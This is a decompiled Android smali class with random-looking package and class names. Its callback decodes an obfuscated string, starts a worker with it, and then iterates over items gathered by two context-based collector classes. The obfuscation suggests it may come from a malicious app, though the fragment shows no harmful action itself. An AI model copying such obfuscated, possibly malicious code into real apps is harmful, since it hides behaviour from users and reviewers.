.class Lru/jdhndtpk/iypwqbmltdwdk/a/d$4;
.super Ljava/lang/Object;

# interfaces
.implements La/a/c/a$a;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lru/jdhndtpk/iypwqbmltdwdk/a/d;->e()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lru/jdhndtpk/iypwqbmltdwdk/a/d;


# direct methods
.method constructor <init>(Lru/jdhndtpk/iypwqbmltdwdk/a/d;)V
    .locals 0

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/a/d$4;->a:Lru/jdhndtpk/iypwqbmltdwdk/a/d;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs a([Ljava/lang/Object;)V
    .locals 3

    sget-boolean v0, Lru/jdhndtpk/iypwqbmltdwdk/e;->c:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    sput-boolean v0, Lru/jdhndtpk/iypwqbmltdwdk/e;->c:Z

    new-instance v0, Lru/jdhndtpk/iypwqbmltdwdk/a/c;

    const-string v1, "eGWmUsuaWJqexQyr"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/a/c;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a/c;->start()V

    :cond_0
    new-instance v0, Lru/jdhndtpk/iypwqbmltdwdk/b/b;

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/b/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/b/b;->b()Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lru/jdhndtpk/iypwqbmltdwdk/b/b$a;

    iget-object v2, p0, Lru/jdhndtpk/iypwqbmltdwdk/a/d$4;->a:Lru/jdhndtpk/iypwqbmltdwdk/a/d;

    invoke-virtual {v2, v0}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->a(Lru/jdhndtpk/iypwqbmltdwdk/b/b$a;)V

    goto :goto_0

    :cond_1
    new-instance v0, Lru/jdhndtpk/iypwqbmltdwdk/b/c;

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/b/c;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/b/c;->b()Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lru/jdhndtpk/iypwqbmltdwdk/b/c$a;

    iget-object v2, p0, Lru/jdhndtpk/iypwqbmltdwdk/a/d$4;->a:Lru/jdhndtpk/iypwqbmltdwdk/a/d;

    invoke-virtual {v2, v0}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->a(Lru/jdhndtpk/iypwqbmltdwdk/b/c$a;)V

    goto :goto_1

    :cond_2
    return-void
.end method
